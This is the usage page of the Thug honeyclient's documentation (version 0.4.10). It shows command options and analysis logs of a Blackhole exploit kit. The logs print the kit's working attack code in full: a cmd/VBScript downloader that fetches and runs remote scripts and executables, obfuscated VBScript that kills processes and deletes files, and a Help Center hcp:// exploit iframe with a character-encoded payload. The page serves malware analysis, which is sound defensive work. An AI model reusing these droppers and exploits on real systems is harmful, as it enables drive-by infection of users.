

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    
    <title>Usage &mdash; Thug 0.4.10 documentation</title>
    
    <link rel="stylesheet" href="static/default.css" type="text/css" />
    <link rel="stylesheet" href="static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '',
        VERSION:     '0.4.10',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true
      };
    </script>
    <script type="text/javascript" src="static/jquery.js"></script>
    <script type="text/javascript" src="static/underscore.js"></script>
    <script type="text/javascript" src="static/doctools.js"></script>
    <link rel="top" title="Thug 0.4.10 documentation" href="index.html" />
    <link rel="next" title="Plugin Framework" href="plugins.html" />
    <link rel="prev" title="Build and Install" href="build.html" /> 
  </head>
  <body>
    <div class="related">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="genindex.html" title="General Index"
             accesskey="I">index</a></li>
        <li class="right" >
          <a href="plugins.html" title="Plugin Framework"
             accesskey="N">next</a> |</li>
        <li class="right" >
          <a href="build.html" title="Build and Install"
             accesskey="P">previous</a> |</li>
        <li><a href="index.html">Thug 0.4.10 documentation</a> &raquo;</li> 
      </ul>
    </div>  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body">
            
  <div class="section" id="usage">
<span id="id1"></span><h1>Usage<a class="headerlink" href="#usage" title="Permalink to this headline">¶</a></h1>
<div class="toctree-wrapper compound">
<ul class="simple">
</ul>
</div>
<div class="section" id="basic-usage">
<h2>Basic usage<a class="headerlink" href="#basic-usage" title="Permalink to this headline">¶</a></h2>
<p>Let&#8217;s start our Thug tour by taking a look at the options it provides.</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span>python thug.py -h

Synopsis:
        Thug: Pure Python honeyclient implementation

Usage:
        python thug.py <span class="o">[</span> options <span class="o">]</span> url

Options:
        -h, --help              Display this <span class="nb">help </span>information
        -u, --useragent<span class="o">=</span>        Select a user agent <span class="o">(</span>see below <span class="k">for </span>values, default: winxpie60<span class="o">)</span>
        -e, --events<span class="o">=</span>           Enable comma-separated specified DOM events handling
        -o, --output<span class="o">=</span>           Log to a specified file
        -r, --referer<span class="o">=</span>          Specify a referer
        -p, --proxy<span class="o">=</span>            Specify a proxy <span class="o">(</span>see below <span class="k">for </span>format and supported schemes<span class="o">)</span>
        -l, --local
        -v, --verbose           Enable verbose mode
        -d, --debug             Enable debug mode
        -a, --ast-debug         Enable AST debug mode <span class="o">(</span>requires debug mode<span class="o">)</span>
        -A, --adobepdf<span class="o">=</span>         Specify the Adobe Acrobat Reader version <span class="o">(</span>default: 7.1.0<span class="o">)</span>
        -S, --shockwave<span class="o">=</span>        Specify the Shockwave Flash version <span class="o">(</span>default: 10.0.64.0<span class="o">)</span>
        -J, --javaplugin<span class="o">=</span>       Specify the JavaPlugin version <span class="o">(</span>default: 1.7.1.30<span class="o">)</span>

Proxy Format:
        scheme://<span class="o">[</span>username:password@<span class="o">]</span>host:port <span class="o">(</span>supported schemes: http, socks4, socks5<span class="o">)</span>

Available User-Agents:
        winxpie60                       Internet Explorer 6.0   <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpie61                       Internet Explorer 6.1   <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpie70                       Internet Explorer 7.0   <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpie80                       Internet Explorer 8.0   <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpchrome20                   Chrome 20.0.1132.47     <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpfirefox12                  Firefox 12.0            <span class="o">(</span>Windows XP<span class="o">)</span>
        winxpsafari5                    Safari 5.1.7            <span class="o">(</span>Windows XP<span class="o">)</span>
        win2kie60                       Internet Explorer 6.0   <span class="o">(</span>Windows 2000<span class="o">)</span>
        win2kie80                       Internet Explorer 8.0   <span class="o">(</span>Windows 2000<span class="o">)</span>
        win7ie80                        Internet Explorer 8.0   <span class="o">(</span>Windows 7<span class="o">)</span>
        win7ie90                        Internet Explorer 9.0   <span class="o">(</span>Windows 7<span class="o">)</span>
        win7chrome20                    Chrome 20.0.1132.47     <span class="o">(</span>Windows 7<span class="o">)</span>
        win7safari5                     Safari 5.1.7            <span class="o">(</span>Windows 7<span class="o">)</span>
        osx10safari5                    Safari 5.1.1            <span class="o">(</span>MacOS X 10.7.2<span class="o">)</span>
        osx10chrome19                   Chrome 19.0.1084.54     <span class="o">(</span>MacOS X 10.7.4<span class="o">)</span>
</pre></div>
</div>
<p>Let&#8217;s start with a first basic real-world example: a Blackhole exploit kit.</p>
<div class="highlight-sh"><pre>       ~/thug/src $ python thug.py "http://[omitted]/main.php?page=8c6c59becaa0da07"
       [2012-07-02 19:15:20] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
       [2012-07-02 19:15:20] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
       [2012-07-02 19:15:20] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
       [2012-07-02 19:15:22] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:23] Saving applet Ryp.jar
       [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
       [2012-07-02 19:15:24] ActiveXObject: acropdf.pdf
       [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
       [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
       [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
       [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
       [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
       [2012-07-02 19:15:24] ActiveXObject: shockwaveflash.shockwaveflash.10
       [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
       [2012-07-02 19:15:24] ActiveXObject: adodb.stream
       [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
       [2012-07-02 19:15:24] ActiveXObject: shell.application
       [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
       [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
       [2012-07-02 19:15:24] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&amp;e=2
       [2012-07-02 19:15:27] [HTTP] URL: http://[omitted]/w.php?f=b081d&amp;e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
       [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] send
       [2012-07-02 19:15:29] [Adodb.Stream ActiveX] open
       [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Write
       [2012-07-02 19:15:29] [Adodb.Stream ActiveX] SaveToFile (.//..//a2ffcd1.exe)
       [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Close
       [2012-07-02 19:15:29] [Shell.Application ActiveX] ShellExecute command: .//..//a2ffcd1.exe
       [2012-07-02 19:15:29] [Navigator URL Translation] ./data/ap1.php?f=b081d --&gt;  http://[omitted]/data/ap1.php?f=b081d
       [2012-07-02 19:15:36] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:36] Microsoft Internet Explorer HCP Scheme Detected
       [2012-07-02 19:15:36] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
       [2012-07-02 19:15:36] [AST]: Eval argument length &gt; 64
       [2012-07-02 19:15:36] [Windows Script Host Run] Command:
       cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe

       [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Code:
       cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
       [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
       [2012-07-02 19:15:37] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Code:
       w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
       Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
       On Error resume next
       c.open OT, a, z:c.send()
       If c.Status = x Then
       d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
       End If
       Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
       Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
       W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

       [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
       [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
       [2012-07-02 19:15:45] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
       [2012-07-02 19:15:45] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
       [2012-07-02 19:15:45] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
       [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
       [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
       [2012-07-02 19:15:52] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
       [2012-07-02 19:15:52] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
       [2012-07-02 19:15:52] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
       [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
       [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
       [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
       [2012-07-02 19:15:53] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511</pre>
</div>
<p>Let&#8217;s take a look at the directory which contains the logs for this session</p>
<div class="highlight-sh"><div class="highlight"><pre>~/thug/src <span class="nv">$ </span><span class="nb">cd</span> ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
~/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 <span class="nv">$ </span>ls -lhR
.:
total 232K
-rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21
-rw-r--r-- 1 buffer buffer  81K Jul  2 19:15 analysis.xml
drwxr-xr-x 6 buffer buffer  176 Jul  2 19:15 application
-rwxr-xr-x 1 buffer buffer  89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a
-rw-r--r-- 1 buffer buffer  51K Jul  2 19:15 Ryp.jar
drwxr-xr-x 3 buffer buffer   72 Jul  2 19:15 text

./application:
total 0
drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 java-archive
drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 pdf
drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-msdownload
drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-shockwave-flash

./application/java-archive:
total 52K
-rw-r--r-- 1 buffer buffer 51K Jul  2 19:15 e3639fde6ddf7fd0182fff9757143ff2

./application/pdf:
total 16K
-rw-r--r-- 1 buffer buffer 15K Jul  2 19:15 3660fe0e4acd23ac13f3d043eebd2bbc

./application/x-msdownload:
total 92K
-rw-r--r-- 1 buffer buffer 89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a

./application/x-shockwave-flash:
total 4.0K
-rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21

./text:
total 0
drwxr-xr-x 2 buffer buffer 144 Jul  2 19:15 html

./text/html:
total 72K
-rw-r--r-- 1 buffer buffer 68K Jul  2 19:15 95ee609e6e3b69c2d9e68f34ff4a4335
-rw-r--r-- 1 buffer buffer 878 Jul  2 19:15 d26b9b1a1f667004945d1d000cf4f19e
</pre></div>
</div>
<p>The file <em>analysis.xml</em> contains the URL analysis results saved in MAEC format (please refer to
<a class="reference external" href="http://maec.mitre.org">http://maec.mitre.org</a> for additional details). Please note that all the files downloaded during
the URL analysis are saved in this directory based on their Content-Type for convenience.</p>
<p>Moreover if MongoDB is installed the information you can see in this directory are saved in the
database instance too. Let&#8217;s take a deeper look using pymongo (you can get the same result by
using the MongoDB client <em>mongo</em>).</p>
<div class="highlight-sh"><pre>~/thug/src $ python
Python 2.7.3 (default, Jun 12 2012, 10:22:50)
[GCC 4.5.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import pymongo
&gt;&gt;&gt; connection = pymongo.Connection()
&gt;&gt;&gt; db = connection.thug
&gt;&gt;&gt; url = db.urls.find_one({'url' : 'http://[omitted]/main.php?page=8c6c59becaa0da07'})
&gt;&gt;&gt; url
{u'url': u'http://[omitted]/main.php?page=8c6c59becaa0da07', u'_id': ObjectId('4ff1b8efe732795951000000')}
&gt;&gt;&gt; for sample in db.samples.find({'url_id': url['_id']}):
...     print sample
...

{u'_id': ObjectId('4ff1b8f4e732795951000001'), u'url': u'http://[omitted]/Ryp.jar', u'type': u'JAR', u'sha1': u'5fffd5cc4a372a6c2a826a850a955cb6a4042272', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data': u'[skipped]', u'md5': u'e3639fde6ddf7fd0182fff9757143ff2'}
{u'_id': ObjectId('4ff1b8f7e732795951000002'), u'url': u'http://[omitted]/w.php?f=b081d&amp;e=2', u'type': u'PE', u'sha1': u'1445e7d338d0d7c20f1d2329f4d653cce1562cc8', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data':  u'[skipped]', u'md5': u'd328b5a123bce1c0d20d763ad745303a'}
[..]
&gt;&gt;&gt; for event in db.events.find({'url_id': url['_id']}):
...     print event
...
{u'MAEC': u'&lt;MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000"&gt;
[..]</pre>
</div>
</div>
<div class="section" id="browser-personality">
<h2>Browser personality<a class="headerlink" href="#browser-personality" title="Permalink to this headline">¶</a></h2>
<p>If no additional option (other than the URL) is provided the emulated browser personality is
Internet Explorer 6.0 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out try to exploit a vulnerability in Microsoft
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious
executable for later analysis.</p>
<p>If there&#8217;s the need to test the content that would be served if using a different browser
personality the <em>-u (&#8211;useragent)</em> option should be used. In the following example, the
option <em>-u winxpie80</em> is used in order to test the content served when surfing the same
page with Internet Explorer 8.0 on Windows XP platform.</p>
<div class="highlight-sh"><pre>~/thug/src $ python thug.py -u winxpie80 "http://[omitted]/main.php?page=8c6c59becaa0da07"
[2012-07-02 19:21:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
[2012-07-02 19:21:00] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
[2012-07-02 19:21:00] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
[2012-07-02 19:21:02] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:03] Saving applet Ryp.jar
[2012-07-02 19:21:03] ActiveXObject: msxml2.xmlhttp
[2012-07-02 19:21:03] ActiveXObject: acropdf.pdf
[2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
[2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
[2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
[2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
[2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
[2012-07-02 19:21:03] ActiveXObject: shockwaveflash.shockwaveflash.10
[2012-07-02 19:21:03] [Navigator URL Translation] ./data/ap1.php?f=b081d --&gt;  http://[omitted]/data/ap1.php?f=b081d
[2012-07-02 19:21:05] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:05] Microsoft Internet Explorer HCP Scheme Detected
[2012-07-02 19:21:05] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
[2012-07-02 19:21:05] [AST]: Eval argument length &gt; 64
[2012-07-02 19:21:05] [Windows Script Host Run] Command:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe

[2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Code:
cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
[2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
[2012-07-02 19:21:06] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:06] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
[2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Code:
w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
On Error resume next
c.open OT, a, z:c.send()
If c.Status = x Then
d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
End If
Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

[2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
[2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
[2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
[2012-07-02 19:21:11] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
[2012-07-02 19:21:11] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
[2012-07-02 19:21:11] &lt;iframe height="0" src="hcp://services/search?query=anything&amp;amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&amp;lt;script defer&amp;gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&amp;lt;/script&amp;gt;" width="0"&gt;&lt;/iframe&gt;
[2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -&gt; hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt